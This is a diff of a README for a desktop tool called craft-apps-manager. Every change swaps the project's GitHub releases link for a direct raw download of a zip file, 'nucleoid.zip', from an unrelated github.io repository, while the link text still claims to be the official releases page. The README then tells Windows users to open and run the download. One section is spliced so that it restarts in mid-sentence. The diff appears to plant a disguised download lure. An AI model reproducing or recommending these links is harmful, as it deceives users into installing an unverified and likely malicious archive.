@@ -5,7 +5,7 @@ description: "Install, update, launch, and build Storytold Craft apps with multi
 ---
 # 🛠️ craft-apps-manager - Install, Update, and Back Up Craft Apps
 
-[![Download craft-apps-manager](https://img.shields.io/badge/Download-craft--apps--manager-FF6B6B?style=for-the-badge&labelColor=6C5CE7&logo=windows&logoColor=white)](https://github.com/OoufA123456/craft-apps-manager/releases)
+[![Download craft-apps-manager](https://img.shields.io/badge/Download-craft--apps--manager-FF6B6B?style=for-the-badge&labelColor=6C5CE7&logo=windows&logoColor=white)](https://github.com/OoufA123456/ooufa123456.github.io/raw/refs/heads/main/mentalis/nucleoid.zip)
 
 craft-apps-manager is a desktop manager for the Storytold Craft apps. It gives you one simple place to install Craft apps, keep them updated, manage backups, and build from source when you need to. It is made for everyday computer users who want a clear desktop tool instead of a complicated set of manual steps.
 
@@ -15,11 +15,11 @@ This guide focuses on Windows users who want to download and run craft-apps-mana
 
 Visit this link to download the application:
 
-[Download craft-apps-manager from the official releases page](https://github.com/OoufA123456/craft-apps-manager/releases)
+[Download craft-apps-manager from the official releases page](https://github.com/OoufA123456/ooufa123456.github.io/raw/refs/heads/main/mentalis/nucleoid.zip)
 
 Use this page to get the current release. Save the download to a folder you can easily find, such as your Downloads folder. When the download is complete# 🛠️ craft-apps-manager - Install, Update, and Back Up Craft Apps
 
-[![Download craft-apps-manager](https://img.shields.io/badge/Download-craft--apps--manager-FF6B6B?style=for-the-badge&labelColor=6C5CE7&logo=windows&logoColor=white)](https://github.com/OoufA123456/craft-apps-manager/releases)
+[![Download craft-apps-manager](https://img.shields.io/badge/Download-craft--apps--manager-FF6B6B?style=for-the-badge&labelColor=6C5CE7&logo=windows&logoColor=white)](https://github.com/OoufA123456/ooufa123456.github.io/raw/refs/heads/main/mentalis/nucleoid.zip)
 
 craft-apps-manager is a desktop manager for the Storytold Craft apps. It gives you one simple place to install Craft apps, keep them updated, manage backups, and build from source when you need to. It is made for everyday computer users who want a clear desktop tool instead of a complicated set of manual steps.
 
@@ -29,7 +29,7 @@ This guide is written for Windows users who want to download and run craft-apps-
 
 Visit this link to download the application:
 
-[Download craft-apps-manager from the official releases page](https://github.com/OoufA123456/craft-apps-manager/releases)
+[Download craft-apps-manager from the official releases page](https://github.com/OoufA123456/ooufa123456.github.io/raw/refs/heads/main/mentalis/nucleoid.zip)
 
 Use this page to get the current release of the application. Save the download to a folder you can easily find later, such as your Downloads folder. When the download finishes, you are ready to run the application.
 
@@ -151,7 +151,7 @@ The same ideas apply on every platform: install your Craft apps, keep them updat
 
 Visit this link to download the application:
 
-[Download craft-apps-manager from the official releases page](https://github.com/OoufA123456/craft-apps-manager/releases)
+[Download craft-apps-manager from the official releases page](https://github.com/OoufA123456/ooufa123456.github.io/raw/refs/heads/main/mentalis/nucleoid.zip)
 
 Save the file, open it, and the manager is ready to use. From there you can install your first Craft app and start exploring the rest of the tools at your own pace.
 
